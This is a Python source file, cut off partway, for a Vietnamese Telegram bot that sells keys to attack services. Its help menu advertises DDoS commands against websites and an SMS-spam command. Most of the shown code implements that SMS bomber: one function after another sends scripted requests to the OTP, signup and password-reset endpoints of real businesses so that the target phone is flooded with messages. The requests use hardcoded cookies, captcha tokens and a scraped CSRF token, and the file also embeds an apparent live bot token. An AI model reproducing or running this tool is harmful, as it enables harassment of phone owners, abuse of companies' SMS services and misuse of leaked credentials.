import telebot
import datetime
import time
import os
import subprocess
import psutil
import sqlite3
import hashlib
import requests
import sys
import socket
import zipfile
import io
import re
import threading

bot_token = '6793943189:AAHaHTz2LaLj_Op0NKDWPM3pc-CFF_Gj4BY'

bot = telebot.TeleBot(bot_token)

allowed_group_id = -1001943835802

allowed_users = []
processes = []
ADMIN_ID = 5123927411
proxy_update_count = 0
last_proxy_update_time = time.time()
key_dict = {}

connection = sqlite3.connect('user_data.db')
cursor = connection.cursor()

# Create the users table if it doesn't exist
cursor.execute('''
    CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        expiration_time TEXT
    )
''')
connection.commit()
def TimeStamp():
    now = str(datetime.date.today())
    return now
def load_users_from_database():
    cursor.execute('SELECT user_id, expiration_time FROM users')
    rows = cursor.fetchall()
    for row in rows:
        user_id = row[0]
        expiration_time = datetime.datetime.strptime(row[1], '%Y-%m-%d %H:%M:%S')
        if expiration_time > datetime.datetime.now():
            allowed_users.append(user_id)

def save_user_to_database(connection, user_id, expiration_time):
    cursor = connection.cursor()
    cursor.execute('''
        INSERT OR REPLACE INTO users (user_id, expiration_time)
        VALUES (?, ?)
    ''', (user_id, expiration_time.strftime('%Y-%m-%d %H:%M:%S')))
    connection.commit()
@bot.message_handler(commands=['add'])
def add_user(message):
    admin_id = message.from_user.id
    if admin_id != ADMIN_ID:
        bot.reply_to(message, 'Chi Dành Cho Admin')
        return

    if len(message.text.split()) == 1:
        bot.reply_to(message, 'Nhập Đúng Định Dạng /add + [id]')
        return

    user_id = int(message.text.split()[1])
    allowed_users.append(user_id)
    expiration_time = datetime.datetime.now() + datetime.timedelta(days=30)
    connection = sqlite3.connect('user_data.db')
    save_user_to_database(connection, user_id, expiration_time)
    connection.close()

    bot.reply_to(message, f'Đã Thêm Người Dùng Có ID Là: {user_id} Sử Dụng Lệnh 30 Ngày')


load_users_from_database()

@bot.message_handler(commands=['getkey'])
def laykey(message):
    bot.reply_to(message, text='Vui Lòng Chờ...')

    with open('key.txt', 'a') as f:
        f.close()

    username = message.from_user.username
    string = f'GL-{username}+{TimeStamp()}'
    hash_object = hashlib.md5(string.encode())
    key = str(hash_object.hexdigest())
    print(key)
    
    try:
        response = requests.get(f'https://web1s.com/api?token=&url=https://anhgit.site/key?key={key}')
        response_json = response.json()
        if 'shortenedUrl' in response_json:
            url_key = response_json['shortenedUrl']
        else:
            url_key = "Lấy Key Lỗi Vui Lòng Sử Dụng Lại Lệnh /getkey"
    except requests.exceptions.RequestException as e:
        url_key = "FLấy Key Lỗi Vui Lòng Sử Dụng Lại Lệnh /getkey"
    
    text = f'''
- Cảm Ơn Bạn Đã Getkey -
- Link Lấy Key Hôm Nay Là: {url_key}
- Nhập Key Bằng Lệnh /key + [key] -
 [Lưu ý: mỗi key chỉ có 1 người dùng]
    '''
    bot.reply_to(message, text)

@bot.message_handler(commands=['key'])
def key(message):
    if len(message.text.split()) == 1:
        bot.reply_to(message, 'Vui Lòng Nhập Key\nVí Dụ /key ttdz1402\nSử Dụng Lệnh /getkey Để Lấy Key')
        return

    user_id = message.from_user.id

    key = message.text.split()[1]
    username = message.from_user.username
    string = f'GL-{username}+{TimeStamp()}'
    hash_object = hashlib.md5(string.encode())
    expected_key = str(hash_object.hexdigest())
    if key == expected_key:
        allowed_users.append(user_id)
        bot.reply_to(message, 'Nhập Key Thành Công')
    else:
        bot.reply_to(message, 'Key Sai Hoặc Hết Hạn\nKhông Sử Dụng Key Của Người Khác!')


@bot.message_handler(commands=['start', 'help'])
def help(message):
    help_text = '''
📌 Tất Cả Các Lệnh:
1️⃣ Lệnh Lấy Key Và Nhập Key
- /getkey : Để lấy key
- /key + [Key] : Kích Hoạt Key
2️⃣ Lệnh Spam 
- /sms + [Số Điện Thoại] : Spam VIP
3️⃣ Lệnh DDoS ( Tấn Công Website )
- /attack + [methods] + [host]
- /methods : Để Xem Methods
- /check + [host] : Kiểm Tra AntiDDoS
- /proxy : Check Số Lượng Proxy
4️⃣ Lệnh Có Ích ^^
- /code + [host] : Lấy Source Code Website
- /getproxy : Proxy Sẽ Tự Động Update Sau 10 Phút
[ Proxy Live 95% Die 5 % ]
- /time : Số Thời Gian Bot Hoạt Động
5️⃣ Info Admin
- /muakey : Để Mua Key VIP
- /admin : Info Admin
- /on : On Bot
- /off : Off Bot
'''
    bot.reply_to(message, help_text)
    
is_bot_active = True
@bot.message_handler(commands=['sms'])
def attack_command(message):
    user_id = message.from_user.id
    if not is_bot_active:
        bot.reply_to(message, 'Bot hiện đang tắt. Vui lòng chờ khi nào được bật lại.')
        return
    
    if user_id not in allowed_users:
        bot.reply_to(message, text='Vui lòng nhập Key\nSử dụng lệnh /getkey để lấy Key')
        return

    if len(message.text.split()) < 2:
        bot.reply_to(message, 'Vui lòng nhập đúng cú pháp.\nVí dụ: /sms + [số điện thoại]')
        return

    username = message.from_user.username

    args = message.text.split()
    phone_number = args[1]

    blocked_numbers = ['113', '114', '115', '198', '911', '0376349783']
    if phone_number in blocked_numbers:
        bot.reply_to(message, 'Bạn không được spam số này.')
        return

    if user_id in cooldown_dict and time.time() - cooldown_dict[user_id] < 200:
        remaining_time = int(200 - (time.time() - cooldown_dict[user_id]))
        bot.reply_to(message, f'Vui lòng đợi {remaining_time} giây trước khi tiếp tục sử dụng lệnh này.')
        return
    
    cooldown_dict[user_id] = time.time()

    username = message.from_user.username

    bot.reply_to(message, f'@{username} Đang Tiến Hành Spam')

    args = message.text.split()
    phone_number = args[1]

    # Gửi dữ liệu tới api
    def dplus(phone_number):
      headers = {
    'authority': 'api.dongplus.vn',
    'accept': '*/*',
    'accept-language': 'vi',
    'content-type': 'application/json',
    'cookie': '_ga_RRJDDZGPYG=GS1.1.1695035603.1.0.1695035603.60.0.0; _ga=GA1.1.1278481503.1695035603',
    'origin': 'https://dongplus.vn',
    'referer': 'https://dongplus.vn/user/login',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
}
      json_data = {
    'phone': phone_number,
}
      response = requests.post(
    'https://api.dongplus.vn/api/user/send-one-time-password',headers=headers,json=json_data)
    def f88(phone_number):
      headers = {
        'Host': 'api.f88.vn',
        'accept': 'application/json, text/plain, */*',
        'content-encoding': 'gzip',
        'user-agent': 'Mozilla/5.0 (Linux; Android 12; Pixel 3 Build/SP1A.210812.016.C1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.136 Mobile Safari/537.36',
        'content-type': 'application/json',
        'origin': 'https://online.f88.vn',
        'referer': 'https://online.f88.vn/',
    }
      data = {
        'phoneNumber': phone_number,
        'recaptchaResponse': '03AFY_a8WJNsx5MK3zLtXhUWB0Jlnw7pcWRzw8R3OhpEx5hu3Shb7ZMIfYg0H2X24378jj2NFtndyzGFF_xjjZ6bbq3obns9JlajYsIz3c1SESCbo05CtzmP_qgawAgOh495zOgNV2LKr0ivV_tnRpikGKZoMlcR5_3bks0HJ4X_R6KgdcpYYFG8cUZRSxSamyRPkC2yjoFNpTeCJ2Q6-0uDTSEBjYU5T3kj8oM8rAAR6BnBVVD7GMz0Ol2OjsmmXO4PtOwR8yipYdwBnL2p8rC8cwbPJ-Q6P1mTmzHkxZwZWcKovlpEGUvt2LfByYwXDMmx7aoI6QMTitY64dDVDdQSWQfyXC1jFg200o5TBFnTY0_0Yik31Y33zCM_r24HQ56KRMuew2LazF8u_30vyWN1tigdvPddOOPjWGjh2cl87l2cF57lCvoRTtOm-RRxyy5l0eq4dgsu2oy1khwawzzP5aE9c2rgcdDVMojZOUpamqhbKtsExad31Brilwf7BSVvu-JT33HtHO',
        'source': 'Online'
    }
      try:
        response = requests.post('https://api.f88.vn/growth/appvay/api/onlinelending/VerifyOTP/sendOTP', json=data, headers=headers)
      except:
        pass
    def fpt(phone_number):
      cookies = {
    '_ga': 'GA1.3.1920025656.1686990031',
    'log_6dd5cf4a-73f7-4a79-b6d6-b686d28583fc': '52680236-63e6-44ea-85c7-2ae8b870397e',
    '_gid': 'GA1.3.1550600958.1687262331',
    '_gat': '1',
    'vMobile': '1',
    '__zi': '2000.SSZzejyD7iu_cVEzsr0LpYAPvhoKKa7GR9V-_iX0Iyv-rUpetayLndwReEhRIH37TfVfwjH8MiTpc-hfq4jSpG.1',
    '__cf_bm': 'RVEEK937c_RiRJhEGx3wkp7ig_FF8mn.7C86PgJiB0c-1687262335-0-Ae+YlUD9RzEt60k728PpN5piSAND0YJfzQ9eLXgJabSG+I8hhyBQFAwKqX0RtgOWOw==',
}
      headers = {
    'Accept': '*/*',
    'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'Cookie': '_ga=GA1.3.1920025656.1686990031; log_6dd5cf4a-73f7-4a79-b6d6-b686d28583fc=52680236-63e6-44ea-85c7-2ae8b870397e; _gid=GA1.3.1550600958.1687262331; _gat=1; vMobile=1; __zi=2000.SSZzejyD7iu_cVEzsr0LpYAPvhoKKa7GR9V-_iX0Iyv-rUpetayLndwReEhRIH37TfVfwjH8MiTpc-hfq4jSpG.1; __cf_bm=RVEEK937c_RiRJhEGx3wkp7ig_FF8mn.7C86PgJiB0c-1687262335-0-Ae+YlUD9RzEt60k728PpN5piSAND0YJfzQ9eLXgJabSG+I8hhyBQFAwKqX0RtgOWOw==',
    'Origin': 'https://fptshop.com.vn',
    'Referer': 'https://fptshop.com.vn/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-A225F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
    'X-Requested-With': 'XMLHttpRequest',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
}
      data = {
    'phone': phone_number,
}
      response = requests.post('https://fptshop.com.vn/api-data/loyalty/Login/Verification', cookies=cookies, headers=headers, data=data)
    def tv360(phone_number):
      cookies = {
    'acw_tc': '6c2ff1c4047289eac933092777c9974a3c6cf0dd183ff5da09edd88376f73c15',
    'img-ext': 'avif',
    'device-id': 's%3Awap_2309dbc6-0f36-4df7-b3d2-7ae8f6b6107c.gGjin700RXZjZb3DQs0auVlGiV4iAceuDGKrhREaatY',
    'shared-device-id': 'wap_2309dbc6-0f36-4df7-b3d2-7ae8f6b6107c',
    'screen-size': 's%3A385x854.YsJCQUjKOJSkUOYLfVhMNjngvj0EBsElrxhbkBkUaj0',
    'G_ENABLED_IDPS': 'google',
    'session-id': 's%3A57d74d42-70ba-4518-9a73-8b5311759288.uylCj1QFrKq42jJ9TcI32wDwMFzpi1YZsxgyHq9PqJM',
    'access-token': '',
    'refresh-token': '',
    'msisdn': '',
    'profile': '',
    'user-id': '',
    'auto-login': 's%3A1.E8d5%2BqHvtoRa81DxWMn1MgOyHoaIIEARCHxdA33Dyqw',
} 
      headers = {
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'Connection': 'keep-alive',
    'Content-Type': 'application/json',

    'Origin': 'http://m.tv360.vn',
    'Referer': 'http://m.tv360.vn/login?r=http%3A%2F%2Fm.tv360.vn%2F',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-A225F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
}
      json_data = {
    'msisdn': phone_number,
}
      response = requests.post(
    'http://m.tv360.vn/public/v1/auth/get-otp-login',
    cookies=cookies,
    headers=headers,
    json=json_data,
    verify=False,
)
    def kingf(phone_number):
      headers = {
    'authority': 'api.onelife.vn',
    'accept': '*/*',
    'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'authorization': '',
    'content-type': 'application/json',
    'origin': 'https://kingfoodmart.com',
    'referer': 'https://kingfoodmart.com/',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-A225F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
}
      json_data = {
    'operationName': 'SendOTP',
    'variables': {
        'phone': phone_number,
    },
    'query': 'mutation SendOTP($phone: String!) {\n  sendOtp(input: {phone: $phone, captchaSignature: "", email: ""}) {\n    otpTrackingId\n    __typename\n  }\n}',
}
      response = requests.post('https://api.onelife.vn/v1/gateway/', headers=headers, json=json_data)
    def onc(phone_number):
      cookies = {
    'OnCredit_id': '6505ae4998db95.05666306',
    'fp_token_7c6a6574-f011-4c9a-abdd-9894a102ccef': '835xziBdaOZueQJS5GCUrEKMNEoUhbxULTv5JgfeG9A=',
    'SN5c8116d5e6183': 'au5rv15099gcmpah7p25bl6cmv',
}
      headers = {
    'authority': 'oncredit.vn',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9,vi-VN;q=0.8,vi;q=0.7',
    'cache-control': 'max-age=0',
    # 'cookie': 'OnCredit_id=6505ae4998db95.05666306; fp_token_7c6a6574-f011-4c9a-abdd-9894a102ccef=835xziBdaOZueQJS5GCUrEKMNEoUhbxULTv5JgfeG9A=; SN5c8116d5e6183=au5rv15099gcmpah7p25bl6cmv',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
}
      response = requests.get('https://oncredit.vn/registration', cookies=cookies, headers=headers).text
      name=response.split('name="CSRFName" value="')[1].split('" />')[0]
      token=response.split('name="CSRFToken" value="')[1].split('" />')[0]
      cookies = {
    'OnCredit_id': '6505ae4998db95.05666306',
    'fp_token_7c6a6574-f011-4c9a-abdd-9894a102ccef': '835xziBdaOZueQJS5GCUrEKMNEoUhbxULTv5JgfeG9A=',
    'SN5c8116d5e6183': 'au5rv15099gcmpah7p25bl6cmv',
}
      headers = {
    'authority': 'oncredit.vn',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'en-US,en;q=0.9,vi-VN;q=0.8,vi;q=0.7',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': 'OnCredit_id=6505ae4998db95.05666306; fp_token_7c6a6574-f011-4c9a-abdd-9894a102ccef=835xziBdaOZueQJS5GCUrEKMNEoUhbxULTv5JgfeG9A=; SN5c8116d5e6183=au5rv15099gcmpah7p25bl6cmv',
    'origin': 'https://oncredit.vn',
    'referer': 'https://oncredit.vn/registration',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}
      data = {
    'data[typeData]': 'sendCodeReg',
    'data[phone]': phone_number,
    'data[email]': '',
    'data[captcha1]': '1',
    'data[lang]': 'vi',
    'CSRFName': name,
    'CSRFToken':token,
}
      response = requests.post('https://oncredit.vn/?ajax', cookies=cookies, headers=headers, data=data)
    def pzc(phone_number):
      cookies = {
    '.Nop.Antiforgery': 'CfDJ8Mw2wCVl0flNoCusKiz1Kh9LW-LYOBR1RUjQoroHgERIMT3CyYbfXPJwX-ETjjjm3Ks2N5wrAjYYTrJ_eSNW127QUapKlEUQ9XwNHWl7Tp9y3o-xWIGF69Wo31XVthr-jnEK9gdGbCgECNm3f98F8dY',
    '.Nop.Customer': '8c6fd72e-d89e-4653-a39b-8fbb29c3c066',
    '.Nop.TempData': 'CfDJ8Mw2wCVl0flNoCusKiz1Kh_i4ZyBKY1gByuyNgbU04tZJ7WI0YjlY40bZJB-8fn38vdCSaPygXlhP-t7ZNX5VLwE80AKkvI4APYwCNNCxo9912fjokYz7zNtEgkA-Wwryvbn-rp8bfCuqvKv6ATiM9gNB0oXIS6zMqSxD6sQDTYltpFwzFumqfDnEFJCNuB1gQ',
}
      headers = {
    'authority': 'thepizzacompany.vn',
    'accept': '*/*',
    'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://thepizzacompany.vn',
    'referer': 'https://thepizzacompany.vn/Otp',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-A225F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}
      data = {
    'phone': phone_number,
    '__RequestVerificationToken': 'CfDJ8Mw2wCVl0flNoCusKiz1Kh_0bsZfJHVyPWNRFQgq0Zy1-xX202bqxs9uSNPWL9aHR-fGQ48Zi_IuqEBa3Us3OesOFem42BwyBH6YY8FRi2MCf6XfXXSa9gksdvOQiWrCDjUE_wgJEfH-e62Uxadk1-A',
}
      pzc = requests.post('https://thepizzacompany.vn/customer/ResendOtp', cookies=cookies, headers=headers, data=data)
    def pl(phone_number):
      headers = {
    'authority': 'api-crownx.winmart.vn',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,vi-VN;q=0.8,vi;q=0.7',
    'authorization': 'Bearer undefined',
    'content-type': 'application/json',
    'origin': 'https://order.phuclong.com.vn',
    'referer': 'https://order.phuclong.com.vn/',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
}
      json_data = {
    'userName': phone_number,
}
      response = requests.post('https://api-crownx.winmart.vn/as/api/plg/v1/user/forgot-pwd', headers=headers, json=json_data)
    def em(phone_number):
      cookies = {
    'language': 'vietn',
    'currency': 'VND',
    'emartsess': '5sk1nf5u2dijaih2p9vm5a2lf4',
    'default': '6c65f6c1437383b0fd9b9a4830',
    'emartCookie': 'Y',
}
      headers = {
    'Accept': 'application/json, text/javascript, */*; q=0.01',
    'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'Cookie': 'language=vietn; currency=VND; emartsess=5sk1nf5u2dijaih2p9vm5a2lf4; default=6c65f6c1437383b0fd9b9a4830; emartCookie=Y',
    'Origin': 'https://emartmall.com.vn',
    'Referer': 'https://emartmall.com.vn/index.php?route=account/register',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-A225F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
    'X-Requested-With': 'XMLHttpRequest',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
}
      data = {
    'mobile': phone_number,
}
      em = requests.post('https://emartmall.com.vn/index.php?route=account/register/smsRegister',cookies=cookies,headers=headers,data=data,)
    def aha(phone_number):
      headers = {
    'authority': 'api.ahamove.com',
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'en-US,en;q=0.9,vi-VN;q=0.8,vi;q=0.7',
    'content-type': 'application/json;charset=UTF-8',
    'origin': 'https://app.ahamove.com',
    'referer': 'https://app.ahamove.com/',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
}
      json_data = {
    'mobile': phone_number,
    'country_code': 'VN',
    'firebase_sms_auth': True,
}
      response = requests.post('https://api.ahamove.com/api/v3/public/user/login', headers=headers, json=json_data)
    def hn(phone_number):
      headers = {
    'authority': 'api.hanagold.vn',
    'accept': 'application/json',
    'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'content-type': 'application/json',
    'origin': 'https://hanagold.vn',
    'referer': 'https://hanagold.vn/',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'token': 'null',
    'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-A225F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
}
      json_data = {
    'email': '',
    'mobile': phone_number,
    'fullname': 'Nguyen Van A',
    'password': '14p22008',
}
      hn = requests.post('https://api.hanagold.vn/app/auth/register', headers=headers, json=json_data)
    def glx(phone_number):
      headers = {
    'authority': 'api.glxplay.io',
    'accept': '*/*',
    'accept-language': 'vi',
    'access-token': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzaWQiOiJhMWQzZWI4Yi0yMTQyLTRjY2ItYTc0Zi04MzYzZmUxMTFhNjIiLCJkaWQiOiI2YWZhMWI1Yy0wNDNkLTQ2M2EtOTEwNi1lNTA2NTRjNTY5ODciLCJpcCI6IjEuNTUuOTYuMTIzIiwibWlkIjoiTm9uZSIsInBsdCI6IndlYnxtb2JpbGV8YW5kcm9pZHwxMHxjaHJvbWUiLCJhcHBfdmVyc2lvbiI6IjIuMC4wIiwiaWF0IjoxNjk3Mjg4MTUzLCJleHAiOjE3MTI4NDAxNTN9.imWOYRJ0uFf2TvX5ZZDuBxUk0AgjyYwu2kwziVSGlNE',
    # 'content-length': '0',
    'origin': 'https://galaxyplay.vn',
    'referer': 'https://galaxyplay.vn/',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}
      params = {
    'phone': phone_number,
}
      response = requests.post('https://api.glxplay.io/account/phone/verify', params=params, headers=headers)
    def vay(phone_number):
      cookies = {
    '_ym_uid': '1687323580684672732',
    '_ym_d': '1687323580',
    '_ym_isad': '2',
    '_ym_visorc': 'b',
}
      headers = {
    'authority': 'api.vayvnd.vn',
    'accept': 'application/json',
    'accept-language': 'vi-VN',
    'content-type': 'application/json; charset=utf-8',
    'origin': 'https://vayvnd.vn',
    'referer': 'https://vayvnd.vn/',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'site-id': '3',
    'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-A225F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
}
      json_data = {
    'login': phone_number,
}
      response = requests.post('https://api.vayvnd.vn/v2/users/password-reset', cookies=cookies, headers=headers, json=json_data)
    def ubo(phone_number):
      headers = {
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'en-US,en;q=0.9,vi-VN;q=0.8,vi;q=0.7',
    'Authorization': 'Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MjkxMzk1MzEsInJvbGVfY29kZSI6ImN1c3RvbWVyIiwidHJhZGVfY29kZSI6IjEwMTAxOTAwMCJ9.eso0bGJdqAUjaHET0iEXUm7I83kwoyNe22_2JjjLbT8AHDZhTf_RNvj0OuxR6AeYJb39_8uI-2ytJaH48oX1mYQUyJjXG-pl4RhA2h0Q6n9znHSVVIrfSR8eSsXoKuEbOnF9VbceXoOMPGTmZ_C5DhwAEmbQNdRcbYRPuIQT6M8tXGVsKfjKU-f80wAPDXwwnKlQsmd2SllLL7dmjzg5lF6MGLzihd6Rm4g5r49qUVsRQPYt1Os7ysIM2eC7cXMDTaXNXs8SBcdcPK2xreN7oOAXhvuyHCMq1RkDKy37owtDUJJLChQIeaTb57y_ecIajQJ0zMKkejoJ7ZQftLi6P54MUT0MUNHOipOvNBgeureOQZ-LljM9MWBIMqb7_kqH3U_J-DYdlTNcDiw8_oV5WufnD4AWdWkttw9rggek8FmvDd0nrYJAdgV8_xDMJmmXeapwuTwoIrR5WZTS7GzZ_wrpthD5nPbrRfdIIOSc0LtMPd4WQore-T-iM65IL8QzUbavp4hlZPJJmGDA_q2MBLRoJOAnbBw4qVw7YxUIfQRfWdBIXlbcxfGydEM2NgqF7Vu7BM8BwQNDXhKZJoKlPcbImlFDOyqmCxpdWIcUgcl5xDLzjefHYEdxQDpPPB7Ro02mz8JxAqAL4RMHsQKJtmRUK7B0eFYkvZkpZjSM-8o',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'Cookie': 'ubo_trade=%7B%22code%22%3A%22101019000%22%2C%22name%22%3A%22H%C3%A0%20N%E1%BB%99i%22%2C%22email%22%3A%22info%40ubofood.com%22%2C%22phone_number%22%3A%220344350998%22%2C%22address%22%3A%7B%22area%22%3A%7B%22code%22%3A%221%22%2C%22name%22%3A%22Mi%E1%BB%81n%20B%E1%BA%AFc%22%7D%2C%22city%22%3A%7B%22code%22%3A%2201%22%2C%22name%22%3A%22Th%C3%A0nh%20ph%E1%BB%91%20H%C3%A0%20N%E1%BB%99i%22%7D%2C%22district%22%3A%7B%22code%22%3A%22019%22%2C%22name%22%3A%22Qu%E1%BA%ADn%20Nam%20T%E1%BB%AB%20Li%C3%AAm%22%7D%2C%22ward%22%3A%7B%22code%22%3A%2200637%22%2C%22name%22%3A%22Ph%C6%B0%E1%BB%9Dng%20Trung%20V%C4%83n%22%7D%2C%22text%22%3A%22CT1A%22%2C%22building%22%3A%22%22%2C%22floor%22%3A%22%22%2C%22apartment_no%22%3A%22%22%7D%2C%22discount%22%3A0%2C%22coordinate%22%3A%7B%22lat%22%3A20.995577269420178%2C%22lng%22%3A105.77924502563441%7D%2C%22status%22%3Atrue%2C%22created_at%22%3A%222022-07-05T15%3A16%3A56.5Z%22%2C%22updated_at%22%3A%222023-02-21T06%3A51%3A36.733Z%22%2C%22updated_by%22%3A%22admin%22%2C%22default_pos_code%22%3A%2200616002%22%7D; 